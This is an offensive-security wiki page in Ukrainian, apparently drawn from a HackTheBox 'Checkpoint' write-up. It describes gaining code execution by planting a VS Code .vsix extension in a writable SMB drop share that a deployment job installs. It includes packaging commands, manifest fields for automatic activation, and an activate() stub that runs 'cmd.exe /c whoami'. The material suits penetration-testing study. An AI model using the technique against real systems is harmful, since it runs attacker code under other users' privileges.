# Виконання через drop share розширення VS Code

{{#include ../banners/hacktricks-training.md}}

Розширення VS Code та Visual Studio VSSDK використовують пакування `.vsix`, але мають різні маніфести й середовища виконання. Доступний для запису SMB drop share стає шляхом до виконання коду **лише якщо** інший користувач або завдання розгортання встановлює з нього пакети у VS Code. Після цього функція `activate()` розширення запускається в хості розширень із привілеями цього користувача. Сам запис `.vsix` у спільну папку не запускає його.<sup>[[1]](#references)[[2]](#references)</sup>

## Процес пакування й активації

Спочатку з’ясуйте версію VS Code, що використовує пакет, і переконайтеся, що спільна папка справді синхронізується або її вміст встановлюється. Створіть розширення TypeScript і розмістіть потрібну дію Node.js у `activate()`. Використайте подію активації, яка спрацьовує без вибору команди користувачем, наприклад `onStartupFinished`, а потім скомпілюйте й запакуйте розширення. `engines.vscode` — це **умова сумісності середовища виконання**; відповідність `@types/vscode` цільовій версії API є заходом сумісності під час збирання, а не вимогою під час встановлення.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

Для редактора, у якому запущено VS Code 1.118, відповідними полями `package.json` є:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

Мінімальна перевірка `activate()` може виконати команду й записати її вивід із хоста розширень. Замінюйте тестову дію лише після перевірки, що пакет активовано в очікуваному обліковому записі/сеансі. Подія `onStartupFinished` спрацьовує після запуску, тому сама по собі не підтверджує виконання, доки редактор фактично не запуститься, а розширення не буде встановлено й увімкнено.<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

Зловмисник із правом запису до drop share може завантажити перевірений пакет і чекати на job, який його використає. У прикладі з Checkpoint доступ до share відновленого облікового запису надав це право; початковий обліковий запис із низькими привілеями міг лише читати share. Не плутайте ці дві передумови. Для розширень **Visual Studio** скористайтеся окремим розділом [Зловживання розширеннями Visual Studio VSIX](visual-studio-vsix-extension-abuse.md), а не цим сценарієм для VS Code.<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - Події активації](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - Публікація розширень](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
